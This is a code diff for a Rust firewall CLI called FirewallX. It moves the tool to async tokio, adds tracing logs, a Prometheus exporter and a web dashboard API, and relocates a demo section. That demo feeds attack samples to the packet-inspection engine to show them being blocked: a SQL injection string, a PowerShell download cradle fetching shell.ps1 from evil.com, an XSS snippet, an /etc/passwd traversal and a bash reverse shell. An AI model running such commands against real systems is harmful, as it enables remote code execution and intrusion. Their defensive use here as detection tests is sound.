@@ -8,6 +8,11 @@ use firewallx::{
 };
 use firewallx::modules::engine::EngineConfig;
 use firewallx::modules::suricata::SuricataParser;
+use std::sync::Arc;
+use tokio::sync::Mutex;
+
+mod api;
+use api::{start_api_server, DashboardState, SharedEngine, SharedVpn};
 use firewallx::modules::wireguard::WgConfigParser;
 use firewallx::modules::rate_limiter::RateLimiter;
 use firewallx::modules::qos::QosManager;
@@ -125,7 +130,7 @@ enum RuleAction {
     },
 }
 
-const CONFIG_PATH: &str = "/etc/firewallx/config.toml";
+const CONFIG_PATH: &str = "config.toml";
 
 fn separator(title: &str) {
     println!("\n{}", "═".repeat(60));
@@ -133,9 +138,24 @@ fn separator(title: &str) {
     println!("{}", "═".repeat(60));
 }
 
-fn main() -> Result<(), anyhow::Error> {
-    env_logger::init();
+#[tokio::main]
+async fn main() -> Result<(), anyhow::Error> {
     let cli = Cli::parse();
+    
+    // Attempt to load config early just for the logging settings
+    let config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|_| FirewallConfig::default());
+    
+    // Initialize tracing
+    if config.json_logging {
+        tracing_subscriber::fmt()
+            .json()
+            .with_env_filter(tracing_subscriber::EnvFilter::from_default_env())
+            .init();
+    } else {
+        tracing_subscriber::fmt()
+            .with_env_filter(tracing_subscriber::EnvFilter::from_default_env())
+            .init();
+    }
 
     match cli.command {
         Commands::Install => {
@@ -154,7 +174,7 @@ fn main() -> Result<(), anyhow::Error> {
             manage_siem(action)?;
         }
         Commands::Start => {
-            start_firewall()?;
+            start_firewall().await?;
         }
     }
     Ok(())
@@ -180,7 +200,7 @@ fn install_firewall() -> Result<(), anyhow::Error> {
 
 fn manage_rules(action: RuleAction) -> Result<(), anyhow::Error> {
     let mut config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|_| {
-        println!("Warning: Could not read config at {}. Using an empty in-memory config to list/add.", CONFIG_PATH);
+        tracing::warn!("Could not read config at {}. Using an empty in-memory config to list/add.", CONFIG_PATH);
         FirewallConfig::default()
     });
     
@@ -246,7 +266,7 @@ fn manage_rules(action: RuleAction) -> Result<(), anyhow::Error> {
 
 fn manage_feeds(action: FeedAction) -> Result<(), anyhow::Error> {
     let mut config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|_| {
-        println!("Warning: Could not read config at {}. Using an empty in-memory config.", CONFIG_PATH);
+        tracing::warn!("Could not read config at {}. Using an empty in-memory config.", CONFIG_PATH);
         FirewallConfig::default()
     });
     
@@ -334,12 +354,12 @@ fn manage_siem(action: SiemAction) -> Result<(), anyhow::Error> {
     Ok(())
 }
 
-fn start_firewall() -> Result<(), anyhow::Error> {
+async fn start_firewall() -> Result<(), anyhow::Error> {
     separator("System Setup");
-    println!("Loading configuration from {}...", CONFIG_PATH);
+    tracing::info!("Loading configuration from {}...", CONFIG_PATH);
     
-    let config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|_| {
-        println!("Warning: Could not read config at {}, using default simulated rules from v0.1.", CONFIG_PATH);
+    let config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|e| {
+        tracing::warn!("Could not read config at {}, using default simulated rules from v0.1. Error: {}", CONFIG_PATH, e);
         let mut cfg = FirewallConfig::default();
         cfg.ruleset.add(Rule::new(1, "Allow SSH", Action::Allow, None, None, Some(22), Protocol::Tcp, Direction::Inbound, None));
         cfg.ruleset.add(Rule::new(2, "Allow HTTPS", Action::Allow, None, None, Some(443), Protocol::Tcp, Direction::Outbound, None));
@@ -348,12 +368,21 @@ fn start_firewall() -> Result<(), anyhow::Error> {
         cfg
     });
 
+    if config.prometheus_enabled {
+        let addr = config.prometheus_addr.parse().unwrap_or_else(|_| "0.0.0.0:9100".parse().unwrap());
+        if let Err(e) = prometheus_exporter::start(addr) {
+            tracing::error!("Failed to start Prometheus exporter on {}: {}", addr, e);
+        } else {
+            tracing::info!("Prometheus metrics exported on http://{}/metrics", addr);
+        }
+    }
+
     #[cfg(target_os = "linux")]
     let mut bpf_opt = None;
     
     #[cfg(target_os = "linux")]
     {
-        println!("Loading eBPF Kernel Program...");
+        tracing::info!("Loading eBPF Kernel Program...");
         let bpf_paths = [
             "../target/bpfel-unknown-none/release/firewallx-ebpf", 
             "target/bpfel-unknown-none/release/firewallx-ebpf",    
@@ -370,7 +399,7 @@ fn start_firewall() -> Result<(), anyhow::Error> {
                     if program.load().is_ok() {
                         // Attach to loopback for demo
                         if program.attach("lo", XdpFlags::default()).is_ok() {
-                            println!("eBPF attached to 'lo' interface successfully! Line-rate blocking active.");
+                            tracing::info!("eBPF attached to 'lo' interface successfully! Line-rate blocking active.");
                             bpf_opt = Some(bpf);
                             break;
                         }
@@ -380,15 +409,15 @@ fn start_firewall() -> Result<(), anyhow::Error> {
         }
         
         if bpf_opt.is_none() {
-            println!("Warning: eBPF kernel program not loaded. Running in standard userspace mode.");
-            println!("Note: eBPF hooks require execution on a Linux environment as root.");
+            tracing::warn!("Warning: eBPF kernel program not loaded. Running in standard userspace mode.");
+            tracing::info!("Note: eBPF hooks require execution on a Linux environment as root.");
         }
     }
     
     #[cfg(not(target_os = "linux"))]
     {
-        println!("Warning: Running on macOS / non-Linux. eBPF hardware acceleration disabled.");
-        println!("Operating in standard userspace engine simulation mode.");
+        tracing::warn!("Warning: Running on macOS / non-Linux. eBPF hardware acceleration disabled.");
+        tracing::info!("Operating in standard userspace engine simulation mode.");
     }
 
     separator("1 · FirewallEngine (stateful + rules + DPI + IDS + Rate Limiter + QoS)");
@@ -399,21 +428,21 @@ fn start_firewall() -> Result<(), anyhow::Error> {
     // Mount Rate Limiter (Fail2Ban behavior)
     if config.max_connections_per_sec > 0 {
         engine.rate_limiter = Some(RateLimiter::new(config.max_connections_per_sec, Duration::from_secs(1)));
-        println!("Mounted Per-IP Rate Limiter: Max {} connections/sec", config.max_connections_per_sec);
+        tracing::info!("Mounted Per-IP Rate Limiter: Max {} connections/sec", config.max_connections_per_sec);
     }
 
     // Mount QoS global tracker
     if config.max_bandwidth_mbps > 0 {
         let bps = config.max_bandwidth_mbps * 1_000_000 / 8; // Convert Mbps to Bytes per second
         engine.qos_manager = Some(QosManager::new(bps));
-        println!("Mounted QoS Global Tracker: Capacity {} Mbps", config.max_bandwidth_mbps);
+        tracing::info!("Mounted QoS Global Tracker: Capacity {} Mbps", config.max_bandwidth_mbps);
     }
     
     // Mount External SIEM Logging
     if config.siem_enabled {
         if let Some(url) = config.siem_url {
             engine.siem = Some(SiemLogger::new(url.clone(), config.siem_api_key));
-            println!("Mounted External SIEM Logger: Forwarding to {}", url);
+            tracing::info!("Mounted External SIEM Logger: Forwarding to {}", url);
         }
     }
 
@@ -426,7 +455,7 @@ fn start_firewall() -> Result<(), anyhow::Error> {
         }
     }
     if total_imported_sigs > 0 {
-        println!("Loaded {} custom Suricata/Snort signatures into DPI module.", total_imported_sigs);
+        tracing::info!("Loaded {} custom Suricata/Snort signatures into DPI module.", total_imported_sigs);
     }
 
     // Apply configured feeds to blocklist manager 
@@ -435,10 +464,14 @@ fn start_firewall() -> Result<(), anyhow::Error> {
     }
 
     if !engine.blocklist_mut().feeds().is_empty() {
-        println!("Fetching dynamically updated blocklist feeds ({} configured)...", engine.blocklist_mut().feeds().len());
+        tracing::info!("Fetching dynamically updated blocklist feeds ({} configured)...", engine.blocklist_mut().feeds().len());
+        
+        let update_interval = std::time::Duration::from_secs(config.blocklist_update_interval_secs);
+        tracing::info!("Blocklist updates requested every {} seconds. Initializing first sync...", config.blocklist_update_interval_secs);
+
         match engine.blocklist_mut().fetch_all_ips() {
             Ok(ips) => {
-                println!("Loaded {} known malicious IPs from threat intelligence feeds.", ips.len());
+                tracing::info!("Loaded {} known malicious IPs from threat intelligence feeds.", ips.len());
                 // Attach to eBPF hashmap if available for immediate line-rate blocking
                 #[allow(unused_mut)]
                 let mut ebpf_added = 0;
@@ -451,85 +484,21 @@ fn start_firewall() -> Result<(), anyhow::Error> {
                                 ebpf_added += 1;
                             }
                         }
-                        println!(" -> Loaded {} IPs directly into kernel eBPF map for line-rate dropping.", ebpf_added);
+                        tracing::info!(" -> Loaded {} IPs directly into kernel eBPF map for line-rate dropping.", ebpf_added);
                     }
                 }
                 
                 // Fallback / standard userspace active blocks loading
                 if ebpf_added < ips.len() {
                     engine.active_blocks = ips;
-                    println!(" -> Loaded {} IPs into FirewallEngine userspace enforcement fallback.", engine.active_blocks.len());
+                    tracing::info!(" -> Loaded {} IPs into FirewallEngine userspace enforcement fallback.", engine.active_blocks.len());
                 }
             }
-            Err(e) => println!("Failed to fetch blocklist feeds: {}", e),
+            Err(e) => tracing::error!("Failed to fetch blocklist feeds: {}", e),
         }
     } else {
-        println!("No blocklist feeds configured. Run `firewallx feed add <URL>` to enable dynamically updated threat intel.");
+        tracing::warn!("No blocklist feeds configured. Run `firewallx feed add <URL>` to enable dynamically updated threat intel.");
     }
-
-    let mut http_pkt = Packet::new(
-        Ipv4Addr::new(203,0,113,1), Ipv4Addr::new(10,0,0,1),
-        54321, 80, Protocol::Tcp, Direction::Inbound, 128
-    );
-
-    let d = engine.process_with_payload(&mut http_pkt, b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n");
-    println!("[HTTP  clean ] {:?}", d);
-    let d = engine.process_with_payload(&mut http_pkt, b"GET /login?user=' OR '1'='1&pass=x HTTP/1.1\r\n");
-    println!("[HTTP  SQLi  ] {:?}  <- DPI blocked", d);
-    let d = engine.process_with_payload(&mut http_pkt, b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')");
-    println!("[HTTP  PS    ] {:?}  <- DPI blocked", d);
-
-    let mut ssh_pkt = Packet::new(Ipv4Addr::new(203,0,113,5), Ipv4Addr::new(10,0,0,1), 60000, 22, Protocol::Tcp, Direction::Inbound, 64);
-    let d = engine.process_with_payload(&mut ssh_pkt, b"SSH-2.0-OpenSSH_8.9p1");
-    println!("[SSH   clean ] {:?}", d);
-
-    let mut rdp_pkt = Packet::new(Ipv4Addr::new(8,8,8,8), Ipv4Addr::new(10,0,0,1), 1234, 3389, Protocol::Tcp, Direction::Inbound, 0);
-    let d = engine.process(&mut rdp_pkt);
-    println!("[RDP   inbnd ] {:?}  <- default deny", d);
-
-    let s = engine.stats();
-    println!("\nStats → total:{} allowed:{} dropped:{} dpi_blocked:{} ips_blocked:{}",
-        s.total, s.allowed, s.dropped, s.dpi_blocked, s.ips_blocked);
-
-    separator("2 · DPI Engine — payload inspection");
-
-    let mut dpi = DpiEngine::new();
-    let samples: &[(&str, &[u8])] = &[
-        ("ELF binary",     b"\x7fELF\x02\x01\x01\x00"),
-        ("XSS attempt",    b"<script>alert('xss')</script>"),
-        ("Path traversal", b"GET /../../../etc/passwd HTTP/1.1"),
-        ("Bash rev shell", b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
-    ];
-    println!("{:<18} {:<12} {:<10} {}", "Sample", "Protocol", "Blocked", "Sig IDs");
-    println!("{}", "-".repeat(60));
-    for (label, payload) in samples {
-        let r = dpi.inspect(payload);
-        let sigs: Vec<_> = r.matches.iter().map(|m| m.sig_id.to_string()).collect();
-        println!("{:<18} {:<12} {:<10} {}", label, r.app_protocol.to_string(), r.blocked, sigs.join(", "));
-    }
-
-    separator("3 · IDS/IPS — behavioural detection");
-
-    let ids = engine.ids_mut();
-    let attacker = Ipv4Addr::new(6,6,6,6);
-    println!("Port scan from {}...", attacker);
-    for port in [22u16, 80, 443, 3306, 5432, 8080] {
-        let pkt = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 9000, port, Protocol::Tcp, Direction::Inbound, 0);
-        for a in ids.inspect(&pkt) {
-            println!("  ALERT [{:?}] {}", a.kind, a.description);
-            if a.kind == AlertKind::BlacklistedIp {
-                #[cfg(target_os = "linux")]
-                if let Some(ref mut bpf) = bpf_opt {
-                    if let Ok(mut blocklist) = AyaHashMap::try_from(bpf.map_mut("BLOCKLIST").unwrap()) {
-                        let ip_key = u32::from_be_bytes(attacker.octets());
-                        let _ = blocklist.insert(ip_key, 1u8, 0);
-                        println!("  [eBPF] Attacker {} added to hardware kernel blocklist!", attacker);
-                    }
-                }
-            }
-        }
-    }
-    println!("Total alerts: {}", ids.total_alerts());
 
     separator("4 · VPN Gateway — tunnel lifecycle");
 
@@ -565,6 +534,85 @@ fn start_firewall() -> Result<(), anyhow::Error> {
     
     println!("Active tunnels: {}", vpn.active_tunnel_count());
 
+    let shared_engine: SharedEngine = Arc::new(Mutex::new(engine));
+    let shared_vpn: SharedVpn = Arc::new(Mutex::new(vpn));
+    
+    let dashboard_state = DashboardState {
+        engine: Arc::clone(&shared_engine),
+        vpn: Arc::clone(&shared_vpn),
+    };
+    
+    // Spawn Web Dashboard API Thread
+    tokio::spawn(async move {
+        start_api_server(dashboard_state).await;
+    });
+
+    let mut engine_lock = shared_engine.lock().await;
+
+    let mut http_pkt = Packet::new(
+        Ipv4Addr::new(203,0,113,1), Ipv4Addr::new(10,0,0,1),
+        54321, 80, Protocol::Tcp, Direction::Inbound, 128
+    );
+
+    let d = engine_lock.process_with_payload(&mut http_pkt, b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n");
+    println!("[HTTP  clean ] {:?}", d);
+    let d = engine_lock.process_with_payload(&mut http_pkt, b"GET /login?user=' OR '1'='1&pass=x HTTP/1.1\r\n");
+    println!("[HTTP  SQLi  ] {:?}  <- DPI blocked", d);
+    let d = engine_lock.process_with_payload(&mut http_pkt, b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')");
+    println!("[HTTP  PS    ] {:?}  <- DPI blocked", d);
+
+    let mut ssh_pkt = Packet::new(Ipv4Addr::new(203,0,113,5), Ipv4Addr::new(10,0,0,1), 60000, 22, Protocol::Tcp, Direction::Inbound, 64);
+    let d = engine_lock.process_with_payload(&mut ssh_pkt, b"SSH-2.0-OpenSSH_8.9p1");
+    println!("[SSH   clean ] {:?}", d);
+
+    let mut rdp_pkt = Packet::new(Ipv4Addr::new(8,8,8,8), Ipv4Addr::new(10,0,0,1), 1234, 3389, Protocol::Tcp, Direction::Inbound, 0);
+    let d = engine_lock.process(&mut rdp_pkt);
+    println!("[RDP   inbnd ] {:?}  <- default deny", d);
+
+    let s = engine_lock.stats();
+    println!("\nStats → total:{} allowed:{} dropped:{} dpi_blocked:{} ips_blocked:{}",
+        s.total, s.allowed, s.dropped, s.dpi_blocked, s.ips_blocked);
+
+    separator("2 · DPI Engine — payload inspection");
+
+    let mut dpi = DpiEngine::new();
+    let samples: &[(&str, &[u8])] = &[
+        ("ELF binary",     b"\x7fELF\x02\x01\x01\x00"),
+        ("XSS attempt",    b"<script>alert('xss')</script>"),
+        ("Path traversal", b"GET /../../../etc/passwd HTTP/1.1"),
+        ("Bash rev shell", b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+    ];
+    println!("{:<18} {:<12} {:<10} {}", "Sample", "Protocol", "Blocked", "Sig IDs");
+    println!("{}", "-".repeat(60));
+    for (label, payload) in samples {
+        let r = dpi.inspect(payload);
+        let sigs: Vec<_> = r.matches.iter().map(|m| m.sig_id.to_string()).collect();
+        println!("{:<18} {:<12} {:<10} {}", label, r.app_protocol.to_string(), r.blocked, sigs.join(", "));
+    }
+
+    separator("3 · IDS/IPS — behavioural detection");
+
+    let ids = engine_lock.ids_mut();
+    let attacker = Ipv4Addr::new(6,6,6,6);
+    println!("Port scan from {}...", attacker);
+    for port in [22u16, 80, 443, 3306, 5432, 8080] {
+        let pkt = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 9000, port, Protocol::Tcp, Direction::Inbound, 0);
+        for a in ids.inspect(&pkt) {
+            println!("  ALERT [{:?}] {}", a.kind, a.description);
+            if a.kind == AlertKind::BlacklistedIp {
+                #[cfg(target_os = "linux")]
+                if let Some(ref mut bpf) = bpf_opt {
+                    if let Ok(mut blocklist) = AyaHashMap::try_from(bpf.map_mut("BLOCKLIST").unwrap()) {
+                        let ip_key = u32::from_be_bytes(attacker.octets());
+                        let _ = blocklist.insert(ip_key, 1u8, 0);
+                        println!("  [eBPF] Attacker {} added to hardware kernel blocklist!", attacker);
+                    }
+                }
+            }
+        }
+    }
+    println!("Total alerts: {}", ids.total_alerts());
+
     separator("FirewallX CLI — Engine operational");
     
     println!("\n[DEMO] Engine and eBPF hook are initialized.");
@@ -580,8 +628,12 @@ fn start_firewall() -> Result<(), anyhow::Error> {
     
     println!("Run `docker exec -it <container> ping localhost` in another terminal to test XDP drops.");
     
+    // Drop lock to allow the Axum thread access
+    drop(engine_lock);
+    
     // In a real firewall, we'd start a packet loop via AF_PACKET/Raw Socket here.
-    // Park the thread to keep the engine & eBPF hooks alive.
-    std::thread::park();
-    Ok(())
+    // Park the async task to keep the engine, Axum API & eBPF hooks alive.
+    loop {
+        tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
+    }
 }
